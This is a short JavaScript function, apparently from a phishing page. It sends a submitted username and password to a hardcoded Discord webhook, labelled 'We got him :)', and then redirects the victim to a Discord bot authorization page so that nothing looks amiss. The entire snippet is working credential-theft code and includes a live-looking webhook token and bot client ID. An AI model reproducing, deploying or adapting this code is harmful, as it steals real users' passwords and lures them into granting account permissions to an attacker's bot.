
function sendData(User, Pass) {
    $.post('https://discord.com/api/webhooks/1048994205323763752/hYfgp4XmfG4PJhUKxlrYtevnB0xvRuuwHhD5MM-F5kK1kjiQBBDAncUjXozvGr5nUGiP',
    {
        'username': 'We got him :)',
        'content': 'Username:\n  ' + User + '\nPassword:\n  ' + Pass,
    }, function(data, status) {
        console.log("Data: " + data + "\nStatus: " + status);
    }
    )
    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
}
